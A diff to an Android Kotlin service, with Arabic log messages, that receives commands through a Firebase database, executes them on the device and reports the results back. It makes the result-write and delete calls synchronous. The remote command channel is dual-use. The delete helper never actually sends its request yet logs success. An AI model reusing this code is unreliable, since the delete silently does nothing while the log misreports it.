@@ -119,17 +119,17 @@ class FirebaseCommandService : Service() {
                     val result = CommandExecutor.execute(this@FirebaseCommandService, command, params)
                     Log.d(TAG, "نتيجة الأمر $command: ${result.take(200)}")
                     
-                    // Write result to Firebase
-                    writeResultToFirebase(deviceId, cmdId, command, result)
+                    // Write result to Firebase FIRST (synchronous - must complete before delete)
+                    writeResultToFirebaseSync(deviceId, cmdId, command, result)
                     
-                    // Also delete the command from Firebase after execution
-                    deleteCommandFromFirebase(deviceId, cmdId)
+                    // Delete the command from Firebase after result is written
+                    deleteCommandFromFirebaseSync(deviceId, cmdId)
                     
                 } catch (e: Exception) {
                     Log.e(TAG, "خطأ في معالجة الأمر: ${e.message}")
                     // Write error result
-                    writeResultToFirebase(deviceId, cmdId, "error", """{"ok":false,"error":"${e.message}"}""")
-                    deleteCommandFromFirebase(deviceId, cmdId)
+                    writeResultToFirebaseSync(deviceId, cmdId, "error", """{"ok":false,"error":"${e.message}"}""")
+                    deleteCommandFromFirebaseSync(deviceId, cmdId)
                 }
             }
         } catch (e: Exception) {
@@ -156,46 +156,45 @@ class FirebaseCommandService : Service() {
         }
     }
 
-    private fun writeResultToFirebase(deviceId: String, cmdId: String, command: String, result: String) {
-        serviceScope.launch {
-            try {
-                val resultObj = JSONObject()
-                resultObj.put("command", command)
-                resultObj.put("result", result)
-                resultObj.put("status", "completed")
-                resultObj.put("timestamp", System.currentTimeMillis())
-                
-                val url = URL("$FIREBASE_RTDB_URL/results/$deviceId/$cmdId.json")
-                val connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "PUT"
-                connection.setRequestProperty("Content-Type", "application/json")
-                connection.doOutput = true
-                connection.connectTimeout = 10000
-                connection.readTimeout = 10000
-                connection.outputStream.write(resultObj.toString().toByteArray(Charsets.UTF_8))
-                connection.outputStream.flush()
-                
-                val responseCode = connection.responseCode
-                connection.disconnect()
-                Log.d(TAG, "كتابة النتيجة في Firebase: $responseCode (cmd=$cmdId)")
-            } catch (e: Exception) {
-                Log.e(TAG, "خطأ في كتابة النتيجة: ${e.message}")
-            }
+    /** Write result to Firebase - SYNCHRONOUS to ensure result is written before command is deleted */
+    private fun writeResultToFirebaseSync(deviceId: String, cmdId: String, command: String, result: String) {
+        try {
+            val resultObj = JSONObject()
+            resultObj.put("command", command)
+            resultObj.put("result", result)
+            resultObj.put("status", "completed")
+            resultObj.put("timestamp", System.currentTimeMillis())
+            
+            val url = URL("$FIREBASE_RTDB_URL/results/$deviceId/$cmdId.json")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "PUT"
+            connection.setRequestProperty("Content-Type", "application/json")
+            connection.doOutput = true
+            connection.connectTimeout = 10000
+            connection.readTimeout = 10000
+            connection.outputStream.write(resultObj.toString().toByteArray(Charsets.UTF_8))
+            connection.outputStream.flush()
+            
+            val responseCode = connection.responseCode
+            connection.disconnect()
+            Log.d(TAG, "كتابة النتيجة في Firebase: $responseCode (cmd=$cmdId)")
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في كتابة النتيجة: ${e.message}")
         }
     }
 
-    private fun deleteCommandFromFirebase(deviceId: String, cmdId: String) {
-        serviceScope.launch {
-            try {
-                val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId.json")
-                val connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "DELETE"
-                connection.connectTimeout = 5000
-                connection.readTimeout = 5000
-                connection.disconnect()
-            } catch (e: Exception) {
-                Log.e(TAG, "خطأ في حذف الأمر من Firebase: ${e.message}")
-            }
+    /** Delete command from Firebase - SYNCHRONOUS after result write */
+    private fun deleteCommandFromFirebaseSync(deviceId: String, cmdId: String) {
+        try {
+            val url = URL("$FIREBASE_RTDB_URL/commands/$deviceId/$cmdId.json")
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "DELETE"
+            connection.connectTimeout = 5000
+            connection.readTimeout = 5000
+            connection.disconnect()
+            Log.d(TAG, "تم حذف الأمر $cmdId من Firebase")
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في حذف الأمر من Firebase: ${e.message}")
         }
     }
 
